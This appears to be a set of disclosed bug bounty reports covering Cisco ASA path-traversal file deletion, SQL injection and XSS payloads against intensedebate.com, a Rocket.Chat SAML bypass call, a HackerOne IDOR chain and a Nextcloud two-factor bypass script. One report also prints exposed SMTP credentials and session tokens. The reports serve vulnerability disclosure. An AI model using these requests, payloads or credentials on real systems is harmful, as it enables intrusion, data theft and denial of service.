A vulnerability in the interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and obtain read and delete access to sensitive files.
Description:
Vulnerable host:
██████████
Impact
An exploit could allow the attacker to view or delete arbitrary files on the system.
Step-by-step Reproduction Instructions
1.Identifying vulnerable host by send request to /+CSCOE+/session_password.html.
curl -skiL "███/+CSCOE+/session_password.html"
Code 387 Bytes
1GET /+CSCOE+/session_password.html HTTP/1.1
2Host: ███████
3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5Accept-Language: en-US,ar;q=0.7,en;q=0.3
6Accept-Encoding: gzip, deflate
7Connection: close
8Cookie: webvpnlogin=1; webvpnLang=en
9Upgrade-Insecure-Requests: 1
If the target is vulnerable, the response header will display webvpn header, like:
The request gave me the following response
Code 194 Bytes
1HTTP/1.1 200 OK
2Content-Type: text/plain
3Content-Length: 0
4Cache-Control: no-cache
5Pragma: no-cache
6Connection: Keep-Alive
7Date: Wed, 04 Nov 2020 21:40:44 GMT
8X-Frame-Options: SAMEORIGIN
9webvpn:
2.Perform exploits to delete files by adding token in cookie header request.
For example, I wanted to delete this (██████/+CSCOU+/csco_logo.gif) file.
That did not work because sometimes logo.gif/png has permission issues so try this "█████/+CSCOE+/blank.html"
You can also delete the file "/+CSCOE+/blank.html" (an empty HTML file), as it might be a problem with the permission of the custom logo file sometimes logo.gif has permission issue so we might not be able to delete but we can delete other files
Request:
Code 357 Bytes
1Host: ██████
2User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
3Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
4Accept-Language: en-US,ar;q=0.7,en;q=0.3
5Accept-Encoding: gzip, deflate
6Connection: close
7Cookie: webvpnlogin=1; webvpnLang=en
8Upgrade-Insecure-Requests: 1```
9
10Response:
11
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
Pragma: no-cache
Connection: Keep-Alive
Date: Wed, 04 Nov 2020 21:54:48 GMT
X-Frame-Options: SAMEORIGIN
Content-Length: 13
Code 17 Bytes
1<HTML></HTML>
2```
3. So I exploited the CVE and deleted the blank file. As following:
Request:
Code 131 Bytes
1GET /+CSCOE+/session_password.html HTTP/1.1
2Host: █████████
3Cookie: token=../+CSCOE+/blank.html
4User-Agent: curl/7.47.0
5Accept: */*
Response:
Code 194 Bytes
1HTTP/1.1 200 OK
2Content-Type: text/plain
3Content-Length: 0
4Cache-Control: no-cache
5Pragma: no-cache
6Connection: Keep-Alive
7Date: Wed, 04 Nov 2020 21:55:02 GMT
8X-Frame-Options: SAMEORIGIN
9webvpn:
File deleted successfully:
curl -Ik ████/+CSCOE+/blank.html
Code 161 Bytes
1HTTP/1.1 404 Not Found
2Cache-Control: no-cache
3Pragma: no-cache
4Connection: Close
5Date: Wed, 04 Nov 2020 21:55:08 GMT
6X-Frame-Options: SAMEORIGIN
7
8File not found
Warning : This can lead to a denial of service (DOS) on the VPN by deleting the lua source code files from the file system, which will break the WebVPN interface until the device is rebooted.
Suggested Mitigation/Remediation Actions
Upgrade the ASA software version per the referenced advisory. This advisory is available at the following link:
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43
Impact
High - This vulnerability allows the attacker to delete files within the web services file system.



==================================================

Report File: 1031321.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Phishing

Contents:

Description
A link in https://developer.twitter.com/en/docs/twitter-api/tools-and-libraries was broken and anyone could create that account which leads to account impersonate
Steps To Reproduce
1) Visit https://developer.twitter.com/en/docs/twitter-api/tools-and-libraries
2) Scroll down to Javascript/Node.js and click on by @HunterLarco (v2)
3) Create github username HunterLarcol
4) When someone visits and scroll down to javascript/Node.js and click on @HunterLarco (v2). They are redirected to my account
similar report
https://hackerone.com/reports/265696
To solve this issue
put this link https://github.com/HunterLarco
Please let me know if you have any questions. I am happy to help
Impact
Impact
The users are coming from developer.twitter.com So, the attacker can put malicious content on the github and many users will be the victim for example https://github.com/HunterLarcol/twitter-v2. Moreover it leads to the loss in the reputation of the company



==================================================

Report File: 1031437.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Authentication - Generic

Contents:

Hi @U.S. Dept Of Defense, I found a host https://██████ which is running on the web services interface of Cisco ASA/FTD and it is vulnerable to CVE-2020-3187 - Unauthenticated arbitrary file deletion in Cisco ASA/FTD. An attacker could exploit this vulnerability by sending a crafted HTTP request containing directory traversal character sequences. An exploit could allow the attacker to view or delete arbitrary files on the targeted system. When the device is reloaded after the exploitation of this vulnerability, any files that were deleted are restored. The attacker can only view and delete files within the web services file system.
Proof of Concept:
Now we know that in CVE-2020-3187 - Unauthenticated arbitrary file deletion in Cisco ASA/FTD. This allow the attacker to view or delete arbitrary files on the targeted system
In this we can delete the files. For example the logo file present on the server at https://████████/+CSCOU+/csco_logo.gif can be deleted by the following steps.
This can be done by sending a curl request as : curl -H "Cookie: token=../+CSCOU+/csco_logo.gif" https://███/+CSCOE+/session_password.html
To delete this just hit the following command on your terminals.
curl -H “Cookie: token=../+CSCOU+/csco_logo.gif” https://█████████/+CSCOE+/session_password.html
If that did not work because sometimes logo.gif/png has permission issues so try this https://█████/+CSCOE+/blank.html
You can also delete the file "/+CSCOE+/blank.html" (an empty HTML file), as it might be a problem with the permission of the custom logo file sometimes logo.gif has permission issue so we might not be able to delete but we can delete other files
Warning : This can lead to a denial of service (DOS) on the VPN by deleting the lua source code files from the file system, which will break the WebVPN interface until the device is rebooted.
Now i haven't deleted the logo file because i didn't wanted to cause any damage so i used another method which can help us confirming that target is vulnerable to this without causing damage and for that just check if /+CSCOE+/session_password.html endpoint exists, and it gives "200 OK" status, then it should be vulnerable because this affected endpoint has been removed from the patched versions.
I sent a curl request to check and it gave 200 ok as shown below:
/+CSCOE+/session_password.html -> 200 = Vulnerable
/+CSCOE+/session_password.html -> 404 = Patched
Mitigation/Remediation Actions:
Upgrade the ASA software version per the referenced advisory. This advisory is available at the following link:
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43
Reference:
https://twitter.com/aboul3la/status/1286809567989575685
https://medium.com/@parasarora06/hunting-for-cve-2020-3187-2020-3452-9f0dcc66f4d8
https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-asaftd-path-JE3azWw43
http://packetstormsecurity.com/files/158648/Cisco-Adaptive-Security-Appliance-Software-9.7-Arbitrary-File-Deletion.html
Impact
High - This vulnerability allows the attacker to delete files within the web services file system.



==================================================

Report File: 1034346.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Insecure Direct Object Reference (IDOR)

Contents:

HackerOne has a number of ways for hackers to submit security vulnerabilities to a program, two of which are through an embedded submission form and through security@ email forwarding. These two features can be exploited to update a report draft created through security@ email forwarding that does not belong to the attacker. In addition to that, the attacker can exploit these features to obtain copies of orphaned platform attachments that were uploaded through an embedded submission form and don't belong to the attacker.
Steps to reproduce
The exploit consists of chaining two vulnerabilities. The first one is an oversight in the access control of report drafts created and updated through an embedded submission form. To reproduce this first vulnerability, a victim will have to send an email that forwards all emails to a HackerOne inbox. An example of such an email address is security@hackerone.com, which forwards emails to our own program. When someone sends an email to this address, they'd receive an email similar to this one:
<image_0>
In the backend, this essentially does two things: it creates a ReportDraft object and a corresponding Invitation object. The email above contains the secret invitation token for the user to get access to the report draft. As long as the invitation is not accepted, the ReportDraft has its reporter_id and tracer attributes set to NULL. When a user would accept the invite, the reporter_id attribute would be overwritten with the user's ID who accepted the invitation. For now, let's not accept the invite and dive into the inner workings of embedded submission forms.
Similar to security@ email forwarding, embedded submission forms allow anonymous users to create a ReportDraft object in the backend. This object contains the current state of the embedded submission form to avoid data loss in case the user happens to close their window. To avoid unauthorized access to other anonymous users writing a report at the same time, the frontend generates a UUID to keep track of which attachments belong to the draft. The ReportDraft stores this UUID in the tracer attribute. Only when the user knows the UUID of this draft will it be able to update the draft. Every request triggered for an unauthenticated session in an embedded submission form will submit this UUID for the backend to authorize the user. This is where the first vulnerability is found.
The Teams::EmbeddedSubmissionsController implements a number of actions, which one of which is draft_sync:
Code 478 Bytes
1# frozen_string_literal: true
2
3module Teams
4  class EmbeddedSubmissionsController < ApplicationController
5    # ...
6    def draft_sync
7      draft = Interactors::ReportDrafts::UpdateOrCreate.interact_without_authorization(
8        draft_id: report_params[:draft_id],
9        # ...
10        handle: team.handle,
11        # ...
12        attachment_ids: report_params[:attachment_ids],
13        as_user: current_user,
14        tracer: report_params[:tracer],
15      )
16    # ...
17  end
18end
HackerOne's backend consolidates business logic, input validation, and authorization into service objects called interactors. This particular interactor is called explicitly without any form of authorization. Among a few other attributes, the interaction is given a draft_id, attachment_ids, tracer, and a reference to the current_user, which is an instance of a User object or an instance of UserAuthentication::AnonymousUser. The handle attribute that is given is the program's handle based on embedded submission UUID. At this point, the application should determine whether the current_user OR a valid tracer value is present, but this check is missing. This is the first vulnerability. When the interaction is executed, it tries to look up a draft using the following code (see draft method):
Code 970 Bytes
1# frozen_string_literal: true
2
3module Interactors
4  module ReportDrafts
5    class UpdateOrCreate < HackeroneInteractor
6      attribute :draft_id, Integer, required: false
7      # ...
8      attribute :attachment_ids, Array, default: []
9      attribute :tracer, String, required: false
10
11      private
12
13      def execute
14        return if draft_id && draft.nil?
15
16        draft.update(
17          # ...
18        )
19
20        draft
21      end
22
23      # ...
24
25      def draft
26        @draft ||= if draft_id
27          ReportDraft.find_by(
28            id: draft_id,
29            team: team,
30            reporter: nil_or_current_user,
31            tracer: tracer,
32          )
33        else
34          ReportDraft.find_or_initialize_by(
35            team: team,
36            reporter: nil_or_current_user,
37            tracer: tracer,
38          )
39        end
40      end
41
42      # ...
43
44      def nil_or_current_user
45        current_user.is_a?(User) ? current_user : nil
46      end
47    end
48  end
49end
Stepping through the code, a user can see that if a draft_id is present, the system will try to look up a ReportDraft object by a tracer UUID and reporter. Going back to the security@ email forwarding, we know that there are ReportDraft objects that have a tracer or reported_by_id attribute set to NULL. This means that an attacker can, by guessing a draft ID created through the security@ email forwarding feature, change the contents of a draft by completely removing the tracer value from a draft sync that is initiated through the embedded submission form. Here is an excerpt of that request:
Code 273 Bytes
1POST /80b9bc53-a236-445d-a7e4-553828b7d533/embedded_submissions/draft_sync HTTP/2
2Host: hackerone.com
3...
4
5{
6  "draft_id": "1",
7  "title": "This becomes the new title for draft 1",
8  "vulnerability_information":"This becomes the new vulnerability information for draft 1"
9}
Once the victim claims the invitation through the email that was shown earlier, they'll see the updated vulnerability information and title.
<image_1>
You can see that the interaction passes all attributes to the update call, see Interactors::ReportDrafts::UpdateOrCreate#execute. This means that the attacker can only change all attributes, reducing the likelihood of the expoitation. However, due to the fact that this allows an attacker to change report drafts, the impact on the integrity is set to high. It could be used to tamper with drafts that are in the process of being submitted to a live program.
To further increase the severity of the vulnerability, it can be chained with another vulnerability. When a user uploads an attachment through an embedded submission form, it'll create an Attachment object that belongs to the ReportDraft object. In the backend, its attributes will look like this:
Code 99 Bytes
1{
2  "id": "1",
3  "uploaded_by_id": null,
4  "attachable_id": 1,
5  "attachable_type": "ReportDraft"
6}
The attachable_id and attachable_type form a polymorphic relation to any other persistent model in HackerOne's database. As long as the user is working on its report, the attachment references a ReportDraft object. On submission, it'll transfer the ownership to the Report that was created – this is the report that customers see. ActiveRecord, the ORM HackerOne uses, has logic to (conveniently) disassociate a polymorphic relation when the model referencing the polymorphic relation overwrites the IDs. To show this, consider the following code example:
Code 832 Bytes
1# Create an attachment. At this time, the `attachable_id` and `attachable_type` are set to `NULL`
2attachment = Attachment.create!
3
4# Create another attachment. At this time, the `attachable_id` and `attachable_type` are set to `NULL`
5another_attachment = Attachment.create!
6
7# Create a report draft and reference the first attachment. The `attachable_id` and `attachable_type` of the attachment are updated to reference the created report draft.
8report_draft = ReportDraft.create! attachment_ids: [attachment.id]
9
10# Update the attachment IDs of a report draft. This will do two things:
11#   - update `attachment.attachable_id` to `NULL`
12#   - update `another_attachment.attachable_type` to `ReportDraft`
13#   - update `another_attachment.attachable_id` to `report_draft.id`
14report_draft.update! attachment_ids: [another_attachment.id]
This means that the attachment, as created in the above code example, is not referencing any object at all. There is a code path in HackerOne's platform to get an attachment in this state: upload an attachment using an embedded submission form, then clicking the "X" to remove it, and type one character in the vulnerability information field to trigger a draft sync. This will leave the first attachment in an orphaned state that has its uploaded_by_id and attachable_id set to NULL. Going back to the Interactors::ReportDrafts::UpdateOrCreate interactor, there's a method that associates attachments to a ReportDraft with the following logic:
Code 258 Bytes
1# ...
2def valid_attachments
3  (
4    draft.attachments.with_attached_file.where(id: attachment_ids) +
5    Attachment.with_attached_file.where(
6      id: attachment_ids,
7      attachable_id: nil,
8      uploaded_by: nil_or_current_user,
9    )
10  ).uniq
11end
12# ...
The code that contains the vulnerability is the second Attachment lookup: it selects all attachment objects that don't have an attachable_id set and that are uploaded by an anonymous user. This means that any attachment that was uploaded by an anonymous user and removed the attachment from a draft can be associated with the attacker's report draft. There are 823 attachments that match this criteria.
An attacker can exploit this chain using the following steps:
in an authenticated session, start typing a report to any program. Observe the network traffic for the draft_sync endpoint to determine the latest report draft ID, which is included in the response (e.g. 1).
in the same session, upload an attachment and observe which ID was associated (e.g. 5).
send an email to the program's email forwarding address (e.g. security@hackerone.com). This will create a report draft with an ID that is one to ~ ten IDs up from the report draft the authenticated user created.
in an incognito browser, go to the program's embedded submission form URL. An example is HackerOne's own form. Start typing and intercept the request to the draft_sync endpoint.
change the draft_id to the ID obtained in step 1 and completely remove the tracer value from the request.
set the attachment_ids to an array containing all possible attachment IDs from 1 to the ID obtained in step 2
claim the report draft through the invitation you received
in the UI, observe that the attachments belonging to the victim are attached to the report draft
copy the ID and inline them in the vulnerability information field, e.g. {F5}
in the report preview section, click the link to obtain a copy of the victim's attachment
Impact
The first vulnerability can be used to change the contents of a number of draft reports that were created through the security@ email forwarding feature. However, chaining the two vulnerabilities would increase the severity as it would allow an attacker to associate orphaned Attachment objects to its own report draft, potentially containing sensitive information. The attacker does not have to be authenticated in order to exploit this vulnerability.



==================================================

Report File: 1035742.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Authentication - Generic

Contents:

Summary:
The endpoint at https://███████/admin/ authenticates the user to the administrator user.
Step-by-step Reproduction Instructions
Navigate to https://███/ and youll notice you will need to log in.
Navigating to https://██████████/admin/ will show you admin malformed page, with the ability to "log out"
As for now as we can see by the picture no data is present at the administrator panel, sure this might change at the future exposing sensitive ifnormation
████████
Suggested Mitigation/Remediation Actions
Issuing 403 response when trying to access the /admin endpoint.
Best regards
nagli
Impact
Admin authentication bypass



==================================================

Report File: 1036877.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Stored

Contents:

Summary:
I have discovered a blind stored cross site scripting vulnerability due to an insecure Contact form available here https://███████.mil/ This form does not properly sanitize user input allowing for the insertion and submission of dangerous characters such as angle brackets. I was able to submit a blind xss payload through the form which was triggered in backend /admin panel.
##Steps To Reproduce:
1-Browse to the page at https://██████.mil/and fill out the contact form submitting your blind XSS payload in First name , Last name, Company and description field.
2-Submit the form and have and admin access the information.
3-This will trigger XSS in the admin panel and a notification to the XSS hunter service with details of the event.
Supporting Material/References:
(the screenshot )[██████████]
The IP address that triggered the XSS payload is ████████
Xss hunter Report █████████
Impact
An attacker is able to access critical information from the admin panel. The XSS reveals the administrator’s IP address, backend application service, titles of mail chimp customer and internal subscription emails, admin session cookies.
An attacker can exploit the above cookies to access the admin panel.



==================================================

Report File: 1039750.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Cross-site Scripting (XSS) - Stored

Contents:

Hi Team,
Summary:
The Intense Debate comment system is vulnerable to stored xss by users , this would allow for atacking admins/users on the blog ,
Platform(s) Affected:
Intense Debate comment system


Steps To Reproduce:
Go to intensedebate.com/moderate/{{-ID-}}
Go to comments > allow images in comments
Now go to your blog and add this payload as comment :
Code 75 Bytes
1<img src="https://intensedebate.com/images/a-addblog.png" onload="alert()">
You'll notice the alert will pop as result for the "onload" attribute ,


Impact
Stealing cookie and secter tokens
Editing html/css/js content for phishing attacks
Thanks for taking your valuable time to read and validate this report



==================================================

Report File: 1040047.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Violation of Secure Design Principles

Contents:

Summary:
This bug is related to wordpress.com. There is feature in wordpress.com which allow users to invite people. We have to enter email address to invite that particular person but the invite link and invite key is also available to the person who invited. This allow attackers to create the profile without having access to the email address and they can make account on behalf of any people who is not already signed up in wordpress.com
Platform(s) Affected:
wordpress.com
public-api.wordpress.com
Steps To Reproduce:
This issue can be reproduced by following these easy steps:
Login to your account on wordpress.com
Setup burpsuite proxy with browser.
Select your site and navigate to manage>people
Enter any email address which is not already registered in wordpress.com and invite
Open this url in browser: https://wordpress.com/people/invites/yoursite.wordpress.com [change yoursite.wordpress.com with your site]
See the burp suite proxy tab and find the GET request to this endpoint [https://public-api.wordpress.com/rest/v1.1/sites/siteId_here/invites?http_envelope=1&status=all&number=100][there will be a number instead of siteId_here]
In response of this GET request you will see JSON which will be consisting of the details about the invitations sent and there you will find "invite_key" and "link".
Copy the link and open this in another browser.
You can create account on behalf of this email without having access to the email and email verification is bypassed :)
See the attached video for POC
Mitigation:
This is the pure violation of secure design principles, this can be mitigated by just removing the [invite_key] and [link] from the response in [https://public-api.wordpress.com/rest/v1.1/sites/siteId_here/invites?http_envelope=1&status=all&number=100]. Because this invite key and link is the property of the person being invited, showing these creds to other people will result this type of issue.
Impact
This issue can be used to bypass email verification on signup. Attackers can create account on behalf on any person without having access to the email account. This issue is affecting integrity of the wordpress.com



==================================================

Report File: 1040373.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Unverified Password Change

Contents:

SUMMARY
When reading the disclosed reports of your program, i see this one report #721341 . The reporter reported a lack of password confirmation when linking accounts. A fix was applied, adding password confirmation when linking account to other services. But i found a way to bypass this, The password confirmation is only done in the client side. This is bad because such methods are vulnerable to response manipulation. I will add a video poc
STEPS TO REPRODUCE
Open a browser in which a user has previously logged into an account, but hasn't logged out.
Open another browser and login using your account
Try to link gmail using your account, it will prompt for a password confirmation, enter your password
Intercept the response and copy it
Go to the victims account and link to gmail again
This time enter any password and intercept response
Paste the copied response from the attacker account
POC
██████████
Impact
An attacker can take over an account and lock a user out by resetting the password.



==================================================

Report File: 1042746.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- SQL Injection

Contents:

Summary
Hello, i have found a SQLI Injection Time Based on https://www.intensedebate.com/changeReplaceOpt.php.
The parameter $_GET['acctid'] is vulnerable.
Detection
I have inject a MySQL function sleep(), and it works.
Code 485 Bytes
1GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15) HTTP/1.1
2Host: www.intensedebate.com
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
4Accept: */*
5Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
6Accept-Encoding: gzip, deflate
7Connection: close
8Referer: https://www.intensedebate.com/install-t
9Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
Response time: 15 414 millis.
Code 484 Bytes
1GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(7) HTTP/1.1
2Host: www.intensedebate.com
3User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
4Accept: */*
5Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
6Accept-Encoding: gzip, deflate
7Connection: close
8Referer: https://www.intensedebate.com/install-t
9Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
7 486 millis.
POC
database() : id_commxn2s
Thank you, good bye.
Impact
Full database access holding private user information.



==================================================

Report File: 1044698.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- SQL Injection

Contents:

[intensedebate.com] SQLi Time Based On /js/commentAction/
Summary:
Hello,
I have found a SQLI Injection Time Based on /js/commentAction/.
When a user want to submit/reply to a comment, a JSON payload was send by a GET request.
Code 119 Bytes
1Host: www.intensedebate.com```
2
3The key `"acctid":"251219"` is vulnerable to SQL Injection Time based
4
5
6## Detection :
7
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(15)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: /
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
Code 32 Bytes
1
2HTTP Response `15 414 millis`
3
4
GET /js/commentAction/?data={"request_type":"0",+"params":+{+"firstCall":true,+"src":0,+"blogpostid":504704482,+"acctid":"251219%20AND%20SLEEP(7)%23",+"parentid":"0",+"depth":"0",+"type":"1",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"anonName":"",+"anonEmail":"X",+"anonURL":"",+"userid":"26745290",+"token":"7D0GVbxG10j8hndedjhegHsnfDrcv0Yh",+"mblid":"1",+"tweetThis":"F",+"subscribeThis":"1",+"comment":"w"}} HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: /
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/commentPopup.php?acct=0de44735e7089c61f14c17373373c235&postid=473573&posttitle=Jimmy%20Butler%20de%20retour,%20les%20Wolves%20
Cookie: login_pref=IDC; idcomments_userid=26745290; idcomments_token=6426c387ebed7ec573f03d218e0d4c2a%7C1607620848; country_code=FR; IDNewThreadComment=w
Code 368 Bytes
1
2HTTP Response `7 660 millis`
3
4Bonus :  the  key`"src":0` is vulnerable to self-XSS, change the value by `"<iframe%20src=%23%20onload=alert('XSS')>"` and you will see a XSS pop-up
5
6
7## POC
8
9SQLi Time based : sleep_7.png, sleep_15.png and POC.mp4
10Self-XSS : Self-XSS.mp4
11
12
13Thank you, good bye.
14
15Fuzzme.
16
17## Impact
18
19Full database access holding private user information.



==================================================

Report File: 1046084.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

Summary:
Hello,
I have found a SQL Injection Union Based on https://intensedebate.com/commenthistory/$YourSiteId
The $YourSiteId into the url is vulnerable to SQL Injection.
Steps to reproduce
Logging into https://intensedebate.com
After create your own site on https://intensedebate.com/install and follow all steps
Now you need to know your site id, to get then you need go to https://intensedebate.com/user-dashboard and you can see on the right side of the page your site list, choice your site and click to the link Overview.
You will be redirected to https://intensedebate.com/dash/$YourSiteId.
Now you have your site id, go to the vulnerable URL with your site id https://intensedebate.com/commenthistory/$YourSiteId.
Now Trigger the SQL Injection with this following link https://intensedebate.com/commenthistory/$YourSiteId%20union%20select%201,2,@@VERSION%23 (!) You need to do this with your own site id (!)
Now you can see 10.1.32-MariaDB on the page.
POC
@@VERSION
<image_0>
current_user()
<image_1>
Video POC
IMPORTANT
Can you see my comment into #1044698 ??
And I no longer want to put all SQL Injection issues on into my initial report #1042746, because i don't win any reputations
Thank you,
Fuzzme.
Impact
Full database access holding private user information and Reflected Cross-Site-Scripting



==================================================

Report File: 1049375.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Improper Access Control - Generic

Contents:

Summary: Rocket.Chat exposes an unauthenticated Meteor method addSamlProvider, which allows disabling SAML signature verification.
Description:
The addSamlProvider Meteor method sets a number of settings, among them a boolean flag that defaults to false:
Code 194 Bytes
1export const addSamlService = function(name: string): void {
2	settings.add(`SAML_Custom_${ name }`, false, {
3		type: 'boolean',
4		group: 'SAML',
5		i18nLabel: 'Accounts_OAuth_Custom_Enable',
6	});
The provider name is entirely user-controlled in this case.
Secondly, if a SAML authentication provider does not have a certificate set, or the setting is falsy, no validation is performed:
Code 150 Bytes
1private verifySignatures(response: Element, assertionData: ISAMLAssertion, xml: string): void {
2	if (!this.serviceProviderOptions.cert) {
3		return;
4	}
Releases Affected:
all versions including meteor-accounts-saml, i.e. 0.8.0 and later.
Steps To Reproduce (from initial installation to vulnerability):
On the login page of a Rocket.Chat instance supporting SAML authentication using a provider named Default (this is the default), run the following Meteor call:
Code 45 Bytes
1Meteor.call("addSamlService", "Default_cert")
Then log in using an arbitrarily faked SAML response.
Suggested mitigation
Remove the addSamlProvider Meteor method. All callers of the underlying function are server-side, therefore it needs not be exposed to the client.
Impact
An unauthenticated attacker can disable SAML certificate validation on an instance with SAML authentication enabled, and then log in as an arbitrary user with administrative privileges.



==================================================

Report File: 1049402.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Information Disclosure

Contents:

Summary:
During recon I discovered a PHP Info file exposing environment variables such as; Laravel APP_KEY, Database username/password, SMTP username/password, etc.
Steps To Reproduce:
Visit the following URL;
Code 25 Bytes
1https://radio.mtn.bj/info
You will be presented with a PHP Info file exposing environment / PHP Variables.
Further Information:
I successfully sent an email using python-smtp-mail-sending-tester with the exposed credentials;
Code 656 Bytes
1$ python smtptest.py -v -u eba@gbdesignweb.com -p w?#h#DLkAPa7 no-reply@mtn.bj pudsec@wearehackerone.com camembert.o2switch.net
2('usetls:', False)
3('usessl:', False)
4('from address:', 'no-reply@mtn.bj')
5('to address:', 'pudsec@wearehackerone.com')
6('server address:', 'camembert.o2switch.net')
7('server port:', 25)
8('smtp username:', 'eba@gbdesignweb.com')
9smtp password: *****
10('smtplib debuglevel:', 0)
11-- Message body ---------------------
12From: no-reply@mtn.bj
13To: pudsec@wearehackerone.com
14Subject: Test Message from smtptest at 2020-12-03 13:02:56
15
16Test message from the smtptest tool sent at 2020-12-03 13:02:56
17-------------------------------------
The APP_KEY being exposed can potential be abused as it's primary purpose is for encrypting cookies, creating signatures and encrypting/decrypting values.
Suggestions:
Never expose PHP Info
Change all passwords and APP_KEY
Impact
Exposing passwords to critical services.
Providing application keys used for encryption/decryption within the app.
Sending email coming from an official email address.



==================================================

Report File: 1050244.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

the attacker could bypass the two-factor authentication enforcement
[ Steps to reproduce ]
Login with an Administrator account.
Click on your administrator profile icon.
Users -> Add group -> group name: Enforcement.
New User -> Username: Bypass -> Password: NextCloudEnforcement -> Add User in group -> Enforcement.
Click on your administrator profile icon.
Settings -> Administration label -> Security -> Two-Factor Authentication -> Enforcement of two-factor authentication can be set for certain groups only. Two-factor authentication is enforced for all members of the following groups. -> Add Enforcement group.
Save changes.
Logout.
Login with Username: Bypass and Password: NextCloudEnforcement the response msg is Two-factor authentication is enforced but has not been configured on your account. Contact your admin for assistance.
Login with Username: Bypass and Password: NextCloudEnforcement with another session.
replace the oc_sessionPassphrase token with the first oc_sessionPassphrase session.
then you have bypassed the two factor authentication enforcement.
[Code]
python script just change the domain to your domain and save as bypass.py
Code 1.15 KiB
1#!/usr/bin/python3
2# python3 -m pip install requests beautifulsoup4
3# python3 bypass.py
4from requests import Session
5from bs4 import BeautifulSoup
6
7class NextCloud(object):
8    def __init__(self, baseURL):
9        self.session = Session()
10        self.baseURL = baseURL
11
12    def login(self, data):
13        response = self.session.get(f'{self.baseURL}/login')
14        soup = BeautifulSoup(response.text, 'html.parser')
15        data.update({
16            'requesttoken': soup.find('head')['data-requesttoken']
17        })
18        self.session.post(f'{self.baseURL}/login', data = data)
19    
20    def getCookies(self):
21        return self.session.cookies.get_dict()
22
23if __name__ == '__main__':
24    baseURL = 'http://nextcloud.diefunction.local'
25    data = {
26        'user': 'bypass',
27        'password': 'NextCloudEnforcement'
28    }
29    firstSession = NextCloud(baseURL)
30    secondSession = NextCloud(baseURL)
31    firstSession.login(data)
32    secondSession.login(data)
33    cookies = firstSession.getCookies()
34    cookies['oc_sessionPassphrase'] = secondSession.getCookies()['oc_sessionPassphrase']
35    print(f'[Cookies] {cookies}') # change your browser cookies to bypass enforcement
change the browser cookies to the script output cookies
[ why its worked ]
I tried to understand why it's worked but I didn't found any reason for that
https://github.com/nextcloud/server/blob/1762a409f954fd9a66e7572704ea9ba7813601b4/core/templates/twofactorselectchallenge.php
[Discovered by]
Abdullah Alharbi @Eng_Abdullahx0
Rayan Althobaiti @Diefunction
Note: if this is an eligible bug please provide a CVE.
Impact
the attacker can gain access to the user dashboard if the user account is enforced with two-factor authentication



==================================================

